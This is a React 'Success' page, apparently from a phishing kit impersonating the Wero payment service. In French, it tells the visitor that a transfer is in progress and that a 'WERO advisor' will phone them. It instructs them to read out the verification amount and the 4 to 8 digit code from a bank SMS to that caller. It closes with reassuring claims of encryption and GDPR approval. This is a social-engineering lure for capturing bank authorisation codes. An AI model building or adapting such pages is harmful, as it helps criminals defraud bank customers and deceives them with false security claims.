
import React from "react";
import { Footer } from "@/components/Footer";
import { Loader } from "lucide-react";

const Success = () => {
  return (
    <div className="min-h-screen flex flex-col">
      <header className="bg-yellow-300 p-4">
        <h1 className="text-2xl font-bold">WERO</h1>
      </header>
      
      <main className="flex-grow flex justify-center p-4">
        <div className="max-w-md w-full bg-white rounded-lg shadow-md p-6">
          <div className="text-center mb-8">
            <h2 className="text-xl font-bold text-blue-500 mb-6">Virement en cours...</h2>
            
            <div className="flex justify-center mb-6">
              <Loader className="w-16 h-16 text-blue-500 animate-spin" />
            </div>
            
            <p className="font-medium mb-8">
              Pour finaliser la confirmation de votre compte,
              un conseiller WERO vous contactera par
              téléphone dans les meilleurs délais.
            </p>
            
            <div className="text-blue-500 mb-8">
              <p className="mb-4">
                En confirmant votre compte bancaire, vous
                autorisez WERO à vous envoyer un SMS ou
                une validation de votre banque. Le SMS
                contient un montant de vérification généré
                aléatoirement ainsi qu'un code composé de 4
                à 8 chiffres. Vous devrez ensuite confirmer
                cette information auprès du conseiller pour
                finaliser la validation.
              </p>
              
              <p>
                Ce processus assure que les informations
                fournies vous appartiennent et que vous êtes
                un utilisateur humain, et non un système
                automatisé.
              </p>
            </div>
            
            <div className="border-t border-gray-200 pt-6">
              <p className="text-xs text-red-500">
                NB : Vos informations sont cryptées et stockées sur un serveur hautement sécurisé validé par le (RGPD), garantissant la protection et la confidentialité de vos données.
              </p>
            </div>
          </div>
        </div>
      </main>
      
      <Footer />
    </div>
  );
};

export default Success;
